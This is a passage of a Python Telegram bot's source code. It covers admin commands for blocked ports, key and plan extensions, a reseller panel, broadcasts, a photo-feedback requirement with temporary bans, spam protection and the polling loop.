            f"<pre>\n"
            f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            f"┃  ❌ PORT NOT FOUND: {key}      ┃\n"
            f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            f"</pre>", parse_mode="HTML")

@bot.message_handler(commands=['blocked_ports'])
def list_blocked_ports(message):
    if not is_admin(message.from_user.id):
        return

    blocked = data.get("blocked_ports", {})
    if not blocked:
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  📋 NO BLOCKED PORTS          ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")
        return

    now = datetime.now()
    text = "<pre>\n┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
    text += "┃  🚫 BLOCKED PORTS             ┃\n"
    text += "┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
    
    for i, (key, t) in enumerate(list(blocked.items())[:10], 1):
        try:
            block_time = datetime.strptime(t, '%d-%m-%Y %H:%M:%S')
            elapsed = (now - block_time).total_seconds()
            remaining = max(0, PORT_BLOCK_DURATION - elapsed)
            mins = int(remaining // 60)
            text += f"┃  {i}. {key} - {mins}m\n"
        except:
            pass
    
    if len(blocked) > 10:
        text += f"┃  ... and {len(blocked)-10} more\n"
    
    text += "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n</pre>"
    bot.reply_to(message, text, parse_mode="HTML")

# ═══════════════════════════════════════════════════════════════════════════
#                          EXTEND COMMANDS
# ═══════════════════════════════════════════════════════════════════════════

@bot.message_handler(commands=['extendall'])
def extend_all(message):
    if not is_owner(message.from_user.id):
        return

    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ⚠️ /extendall dur            ┃\n"
            "┃  ex: /extendall 1w           ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")
        return

    duration_str = parts[1]
    try:
        duration_secs = parse_duration(duration_str)
    except ValueError:
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ❌ INVALID DURATION          ┃\n"
            "┃  USE: 1h, 1d, 1w, 1m         ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")
        return

    users_db = data.get("users", {})
    now = datetime.now()
    extended_count = 0

    for uid, udata in users_db.items():
        expiry_str = udata.get("expiry_time")
        if expiry_str:
            try:
                expiry = datetime.strptime(expiry_str, "%Y-%m-%d %H:%M:%S")
                if expiry > now:
                    new_expiry = expiry + timedelta(seconds=duration_secs)
                    udata["expiry_time"] = new_expiry.strftime("%Y-%m-%d %H:%M:%S")
                    extended_count += 1
                    try:
                        bot.send_message(int(uid),
                            f"<pre>\n"
                            f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                            f"┃  🎁 PLAN EXTENDED!            ┃\n"
                            f"┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
                            f"┃  +{duration_str} ADDED         ┃\n"
                            f"┃  📅 {udata['expiry_time'][:10]}  ┃\n"
                            f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                            f"</pre>", parse_mode="HTML")
                    except:
                        pass
            except:
                pass

    if extended_count > 0:
        save_data()
        bot.reply_to(message,
            f"<pre>\n"
            f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            f"┃  ✅ EXTENDED {extended_count}   ┃\n"
            f"┃     ACTIVE USERS BY {duration_str} ┃\n"
            f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            f"</pre>", parse_mode="HTML")
    else:
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ℹ️ NO ACTIVE USERS TO        ┃\n"
            "┃     EXTEND                    ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")

@bot.message_handler(commands=['extendkey'])
def extend_key(message):
    if not is_owner(message.from_user.id):
        return

    parts = message.text.split()
    if len(parts) < 3:
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ⚠️ /extendkey dur keys       ┃\n"
            "┃  ex: /extendkey 1w K12345    ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")
        return

    duration_str = parts[1]
    try:
        duration_secs = parse_duration(duration_str)
    except ValueError:
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ❌ INVALID DURATION          ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")
        return

    keys_to_extend = parts[2:]
    keys_db = data.get("keys", {})
    users_db = data.get("users", {})
    now = datetime.now()
    
    success_keys = []
    failed_keys = []

    for key in keys_to_extend[:5]:
        if key not in keys_db:
            failed_keys.append(f"{key} (NOT FOUND)")
            continue
        
        key_info = keys_db[key]
        
        if key_info.get("status") == "banned":
            failed_keys.append(f"{key} (BANNED)")
            continue
        
        if key_info.get("status") == "redeemed":
            redeemed_by = key_info.get("redeemed_by")
            if redeemed_by and redeemed_by in users_db:
                expiry_str = users_db[redeemed_by].get("expiry_time")
                if expiry_str:
                    try:
                        expiry = datetime.strptime(expiry_str, "%Y-%m-%d %H:%M:%S")
                        if expiry > now:
                            new_expiry = expiry + timedelta(seconds=duration_secs)
                        else:
                            new_expiry = now + timedelta(seconds=duration_secs)
                        users_db[redeemed_by]["expiry_time"] = new_expiry.strftime("%Y-%m-%d %H:%M:%S")
                        success_keys.append(f"{key} (USER)")
                        try:
                            bot.send_message(int(redeemed_by),
                                f"<pre>\n"
                                f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                                f"┃  🎁 KEY EXTENDED!             ┃\n"
                                f"┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
                                f"┃  +{duration_str} ADDED         ┃\n"
                                f"┃  📅 {users_db[redeemed_by]['expiry_time'][:10]} ┃\n"
                                f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                                f"</pre>", parse_mode="HTML")
                        except:
                            pass
                    except:
                        failed_keys.append(f"{key} (ERROR)")
        else:
            key_info["duration"] = key_info.get("duration", 0) + duration_secs
            old_dur_str = key_info.get("duration_str", "")
            key_info["duration_str"] = f"{old_dur_str} + {duration_str}"
            success_keys.append(f"{key} (KEY)")

    if success_keys:
        save_data()
    
    result = "<pre>\n┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
    result += f"┃  ✅ EXTENDED (+{duration_str}) ┃\n"
    
    for k in success_keys[:3]:
        result += f"┃  • {k[:20]}\n"
    if len(success_keys) > 3:
        result += f"┃  ... +{len(success_keys)-3}\n"
    
    if failed_keys:
        result += "┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
        result += "┃  ❌ FAILED:                  ┃\n"
        for k in failed_keys[:3]:
            result += f"┃  • {k[:18]}\n"
    
    result += "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n</pre>"
    bot.reply_to(message, result, parse_mode="HTML")

@bot.message_handler(commands=['extendtype'])
def extend_type(message):
    if not is_owner(message.from_user.id):
        return

    parts = message.text.split()
    if len(parts) != 3:
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ⚠️ /extendtype add type          ┃\n"
            "┃  ex: /extendtype 7d 1d           ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")
        return

    add_duration_str = parts[1]
    target_str = parts[2]
    
    try:
        add_secs = parse_duration(add_duration_str)
    except ValueError:
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ❌ INVALID ADD DURATION      ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")
        return
    
    keys_db = data.get("keys", {})
    users_db = data.get("users", {})
    now = datetime.now()
    
    extended_count = 0
    
    for key, info in keys_db.items():
        if info.get("duration_str") == target_str and info.get("status") != "banned":
            if info.get("status") == "redeemed":
                redeemed_by = info.get("redeemed_by")
                if redeemed_by and redeemed_by in users_db:
                    expiry_str = users_db[redeemed_by].get("expiry_time")
                    if expiry_str:
                        try:
                            expiry = datetime.strptime(expiry_str, "%Y-%m-%d %H:%M:%S")
                            if expiry > now:
                                new_expiry = expiry + timedelta(seconds=add_secs)
                            else:
                                new_expiry = now + timedelta(seconds=add_secs)
                            users_db[redeemed_by]["expiry_time"] = new_expiry.strftime("%Y-%m-%d %H:%M:%S")
                            extended_count += 1
                        except:
                            pass
            else:
                info["duration"] = info.get("duration", 0) + add_secs
                extended_count += 1
    
    if extended_count > 0:
        save_data()
        bot.reply_to(message,
            f"<pre>\n"
            f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            f"┃  ✅ EXTENDED {extended_count}    ┃\n"
            f"┃     {target_str} KEYS BY        ┃\n"
            f"┃     +{add_duration_str}         ┃\n"
            f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            f"</pre>", parse_mode="HTML")
    else:
        bot.reply_to(message,
            f"<pre>\n"
            f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            f"┃  ℹ️ NO {target_str} KEYS       ┃\n"
            f"┃     TO EXTEND                 ┃\n"
            f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            f"</pre>", parse_mode="HTML")
        
# ═══════════════════════════════════════════════════════════════════════════
#                          RESELLER PANEL & ADD COMMANDS
# ═══════════════════════════════════════════════════════════════════════════

@bot.message_handler(commands=['reseller'])
def reseller_panel(message):
    user_id = str(message.from_user.id)
    if user_id not in data.get("resellers", {}) and not is_owner(message.from_user.id):
        return

    balance = data.get("resellers", {}).get(user_id, {}).get("balance", 0)
    rates = data.get("rates", {})
    
    text = "<pre>\n┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
    text += "┃  📛 RESELLER PANEL          ┃\n"
    text += "┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
    text += f"┃  💰 BALANCE: {balance}         ┃\n"
    text += "┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
    text += "┃  💲 RATES:                    ┃\n"
    
    for r, c in list(rates.items())[:4]:
        text += f"┃  • {r}: {c} coins\n"
    
    text += "┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
    text += "┃  🔹 /gen duration            ┃\n"
    text += "┃  🔹 /bankey key              ┃\n"
    text += "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n</pre>"
    
    bot.reply_to(message, text, parse_mode="HTML")

@bot.message_handler(commands=['broadcast'])
def broadcast_command(message):
    if not is_owner(message.from_user.id):
        return

    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) < 2:
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ⚠️ /broadcast message        ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")
        return

    broadcast_msg = command_parts[1]
    
    users_db = data.get("users", {})
    resellers_db = data.get("resellers", {})
    all_users = set(list(users_db.keys()) + list(resellers_db.keys()))

    if not all_users:
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  📋 NO USERS TO BROADCAST     ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")
        return

    success = 0
    failed = 0
    
    status_msg = bot.reply_to(message,
        f"<pre>\n"
        f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
        f"┃  📢 BROADCASTING TO           ┃\n"
        f"┃     {len(all_users)} USERS...     ┃\n"
        f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
        f"</pre>", parse_mode="HTML")
    
    for uid in list(all_users)[:100]:
        try:
            bot.send_message(int(uid),
                f"<pre>\n"
                f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                f"┃  📢 BROADCAST FROM OWNER     ┃\n"
                f"┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
                f"┃  {broadcast_msg[:40]}\n"
                f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                f"</pre>", parse_mode="HTML")
            success += 1
            time.sleep(0.05)
        except:
            failed += 1

    bot.edit_message_text(
        f"<pre>\n"
        f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
        f"┃  ✅ BROADCAST COMPLETE!       ┃\n"
        f"┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
        f"┃  🟢 SUCCESS: {success}          ┃\n"
        f"┃  🔴 FAILED: {failed}           ┃\n"
        f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
        f"</pre>",
        chat_id=status_msg.chat.id,
        message_id=status_msg.message_id,
        parse_mode="HTML")

# ═══════════════════════════════════════════════════════════════════════════
#                          FEEDBACK SYSTEM
# ═══════════════════════════════════════════════════════════════════════════

@bot.message_handler(commands=['feedback'])
def feedback_command(message):
    user_id = message.from_user.id
    
    if not check_access(message):
        return
    
    if not data.get("feedback_required", True):
        bot.reply_to(message,
            "<pre>\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  ℹ️ FEEDBACK NOT REQUIRED     ┃\n"
            "┃  You can continue using bot.  ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "</pre>", parse_mode="HTML")
        return
    
    pending_feedback[user_id] = True
    feedback_deadlines[user_id] = time.time() + 300
    
    bot.reply_to(message,
        "<pre>\n"
        "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
        "┃  📸 PLEASE SEND A PHOTO       ┃\n"
        "┃     AS FEEDBACK!              ┃\n"
        "┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n"
        "┃  ⏰ YOU HAVE 5 MINUTES        ┃\n"
        "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
        "</pre>", parse_mode="HTML")

@bot.message_handler(content_types=['photo'])
def photo_feedback(message):
    user_id = message.from_user.id
    username = message.from_user.first_name

    if user_id not in pending_feedback:
        return

    bot.send_message(message.chat.id,
        f"<pre>\n"
        f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
        f"┃  ⚡ THANKS {username}!          ┃\n"
        f"┃  FEEDBACK SUBMITTED! ⚡       ┃\n"
        f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
        f"</pre>", parse_mode="HTML")

    try:
        bot.send_photo(
            FEEDBACK_CHANNEL_ID,
            photo=message.photo[-1].file_id,
            caption=(
                "<pre>\n"
                "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                "┃  📥 FEEDBACK RECEIVED        ┃\n"
                f"┃  👤 {username} ({user_id})\n"
                "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                "</pre>"
            ),
            parse_mode="HTML"
        )
        
        pending_feedback.pop(user_id, None)
        feedback_deadlines.pop(user_id, None)
        
        if user_id in temp_banned_users:
            temp_banned_users.pop(user_id, None)
            
    except Exception as e:
        logger.error(f"Error sending feedback: {e}")

def feedback_check_loop():
    while True:
        now = time.time()
        for uid in list(feedback_deadlines.keys()):
            if now > feedback_deadlines[uid]:
                temp_banned_users[uid] = now + 600
                pending_feedback.pop(uid, None)
                feedback_deadlines.pop(uid, None)
                try:
                    bot.send_message(uid,
                        "<pre>\n"
                        "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                        "┃  ⛔ BANNED FOR 10 MINUTES     ┃\n"
                        "┃     MISSED FEEDBACK!          ┃\n"
                        "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                        "</pre>", parse_mode="HTML")
                except:
                    pass
        time.sleep(10)

threading.Thread(target=feedback_check_loop, daemon=True).start()

@bot.message_handler(func=lambda m: True)
def spam_protection_handler(message):
    if not data.get("spam_protection", True):
        return
    
    user_id = message.from_user.id
    
    if is_owner(user_id):
        return
    
    now = time.time()
    
    # Check if user spamming (more than 5 commands in 10 seconds)
    if user_id in user_command_count:
        # Reset if older than 10 seconds
        if now - user_last_command.get(user_id, 0) > 10:
            user_command_count[user_id] = 1
        else:
            user_command_count[user_id] = user_command_count.get(user_id, 0) + 1
            
        if user_command_count[user_id] > 5:
            # Ban for 5 minutes
            data["temp_banned_spam"][str(user_id)] = now + 300
            save_data()
            bot.reply_to(message,
                "<pre>\n"
                "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                "┃  ⛔ SPAM DETECTED!            ┃\n"
                "┃  You are banned for 5 minutes ┃\n"
                "┃  due to spamming.             ┃\n"
                "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                "</pre>", parse_mode="HTML")
    else:
        user_command_count[user_id] = 1
    
    user_last_command[user_id] = now

@bot.message_handler(func=lambda m: True)
def handle_other(message):
    pass

# ═══════════════════════════════════════════════════════════════════════════
#                              MAIN BOT LOOP
# ═══════════════════════════════════════════════════════════════════════════

start_time = time.time()

if __name__ == "__main__":
    print("╔════════════════════════════════════════════╗")
    print("║  🤖 BOT STARTING...                       ║")
    print("║  ⚡ SLASH BOT ACTIVATED!                   ║")
    print("║  💻 DEVELOPER: @LASTWISHES01             ║")
    print("╚════════════════════════════════════════════╝")
    
    while True:
        try:
            bot.polling(none_stop=True, timeout=60, long_polling_timeout=60)
        except Exception as e:
            logger.error(f"Polling error: {e}")
            print(f"╔════════════════════════════════════════════╗")
            print(f"║  ❌ ERROR: {str(e)[:35]}...                 ║")
            print(f"║  🔄 RESTARTING IN 5 SECONDS...            ║")
            print(f"╚════════════════════════════════════════════╝")
            time.sleep(5)
